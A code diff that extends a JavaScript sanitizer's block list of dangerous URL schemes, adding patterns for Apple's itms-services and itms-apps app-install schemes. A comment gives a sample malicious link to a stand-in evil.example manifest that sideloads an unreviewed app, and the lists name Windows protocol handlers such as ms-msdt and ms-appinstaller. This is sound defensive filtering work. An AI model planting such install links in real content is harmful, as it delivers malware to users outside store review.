@@ -566,6 +566,14 @@ const unsafeContentPatterns = [
   { pattern: /\sdir\s*=/i, reason: 'dir attributes are not allowed in article content' },
   { pattern: /\bjavascript\s*:/i, reason: 'javascript: URLs are not allowed in article content' },
   { pattern: /\bvbscript\s*:/i, reason: 'vbscript: URLs are not allowed in article content' },
+  // itms-services:/itms-apps: are Apple's app-install / App-Store URL schemes. A
+  // clicked itms-services://?action=download-manifest&url=https://evil.example/m.plist
+  // makes iOS download a manifest and over-the-air install an enterprise/ad-hoc app
+  // outside any store review (a documented sideloading / malware-delivery vector), and
+  // itms-apps: deep-links the App Store app — the OS, not the browser, resolves them,
+  // with no script. Same native app-install protocol-handler class as the blocked
+  // Windows ms-appinstaller: scheme; the hyphenated "itms" token never occurs in prose.
+  { pattern: /\bitms(?:-apps|-services)?\s*:/i, reason: 'Apple app-install and App Store URL schemes are not allowed in article content' },
   // blob:/filesystem: object-URL schemes reference a resource fetched from an
   // opaque origin (a Blob or the sandboxed filesystem) rather than a normal http(s)
   // URL. In an injected <a href> or <img src> they are a resource-load/navigation
@@ -649,6 +657,7 @@ const unsafeContentPatterns = [
 const obfuscatedSchemePatterns = [
   { pattern: /javascript\s*:/i, reason: 'javascript: URLs are not allowed in article content' },
   { pattern: /vbscript\s*:/i, reason: 'vbscript: URLs are not allowed in article content' },
+  { pattern: /\bitms(?:-apps|-services)?\s*:/i, reason: 'Apple app-install and App Store URL schemes are not allowed in article content' },
   { pattern: /(?:blob|filesystem)\s*:/i, reason: 'object-URL schemes are not allowed in article content' },
   { pattern: /(?:search-ms|ms-officecmd)\s*:/i, reason: 'Windows protocol-handler URLs are not allowed in article content' },
   { pattern: /ms-(?:msdt|appinstaller)\s*:/i, reason: 'Windows protocol-handler URLs are not allowed in article content' },
@@ -667,6 +676,7 @@ const obfuscatedSchemePatterns = [
 const infoboxRowValueSchemePatterns = [
   /javascript\s*:/i,
   /vbscript\s*:/i,
+  /\bitms(?:-apps|-services)?\s*:/i,
   /(?:blob|filesystem)\s*:/i,
   /(?:search-ms|ms-officecmd)\s*:/i,
   /ms-(?:msdt|appinstaller)\s*:/i,
